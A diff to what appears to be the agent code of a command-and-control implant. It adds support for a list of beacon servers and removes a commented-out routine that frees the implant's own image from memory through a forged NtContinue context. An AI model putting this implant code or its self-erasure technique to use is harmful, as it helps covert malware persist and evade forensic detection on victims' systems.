@@ -19,7 +19,7 @@ void AgentMain()
 
 	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
 	*g_Connector = ConnectorHTTP();
-	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->http_method, (CHAR*)g_Agent->config->servers[0], g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders);
+	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->http_method, g_Agent->config->servers_count, (CHAR**)g_Agent->config->servers, g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders);
 
 	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
 	*packerOut = Packer();
@@ -69,54 +69,8 @@ void AgentMain()
 	AgentClear(g_Agent->config->exit_method);
 }
 
-//#if defined(_M_X64) || defined(__x86_64__)
-//#define PTR_TYPE DWORD64
-//#define CONTEXT_IP(ctx) (ctx).Rip
-//#define CONTEXT_SP(ctx) (ctx).Rsp
-//#define CONTEXT_ARG1(ctx) (ctx).Rcx
-//#define CONTEXT_ARG2(ctx) (ctx).Rdx
-//#define CONTEXT_ARG3(ctx) (ctx).R8
-//#define CONTEXT_ARG4(ctx) (ctx).R9
-//#define IMAGE_NT_HEADERS_TYPE PIMAGE_NT_HEADERS
-//#else
-//#define PTR_TYPE DWORD
-//#define CONTEXT_IP(ctx) (ctx).Eip
-//#define CONTEXT_SP(ctx) (ctx).Esp
-//#define CONTEXT_ARG1(ctx) (ctx).Ecx
-//#define CONTEXT_ARG2(ctx) (ctx).Edx
-//#define CONTEXT_ARG3(ctx) (ctx).Ebx
-//#define CONTEXT_ARG4(ctx) (ctx).Esi
-//#define IMAGE_NT_HEADERS_TYPE PIMAGE_NT_HEADERS32
-//#endif
-
 void AgentClear(int method)
 {
-	//PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
-	//PLIST_ENTRY modList = &Peb->Ldr->InLoadOrderModuleList;
-	//PVOID moduleAddr = ((PLDR_DATA_TABLE_ENTRY)modList->Flink)->DllBase;
-
-	//ULONG elfanew = ((PIMAGE_DOS_HEADER)moduleAddr)->e_lfanew;
-	//DWORD moduleSize = (((IMAGE_NT_HEADERS_TYPE)((PBYTE)moduleAddr + elfanew))->OptionalHeader.SizeOfImage);
-
-	//CONTEXT ctx = { 0 };
-	//ctx.ContextFlags = CONTEXT_FULL;
-	//ApiWin->RtlCaptureContext(&ctx);
-
-	//CONTEXT_IP(ctx) = (PTR_TYPE)ApiNt->NtFreeVirtualMemory;
-	//CONTEXT_SP(ctx) = (PTR_TYPE)((CONTEXT_SP(ctx) & ~(0x1000 - 1)) - 0x1000);
-	//CONTEXT_ARG1(ctx) = (PTR_TYPE)NtCurrentProcess();
-	//CONTEXT_ARG2(ctx) = (PTR_TYPE)(&moduleAddr);
-	//CONTEXT_ARG3(ctx) = (PTR_TYPE)(&moduleSize);
-	//CONTEXT_ARG4(ctx) = (PTR_TYPE)MEM_RELEASE;
-
-	//if (method == 1)
-	//	*(PTR_TYPE volatile*)(CONTEXT_SP(ctx)) = (PTR_TYPE)ApiNt->RtlExitUserThread;
-	//else if (method == 2)
-	//	*(PTR_TYPE volatile*)(CONTEXT_SP(ctx)) = (PTR_TYPE)ApiNt->RtlExitUserProcess;
-
-	//ctx.ContextFlags = CONTEXT_FULL;
-	//ApiNt->NtContinue(&ctx, FALSE);
-
 	if (method == 1)
 		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
 	else if (method == 2)
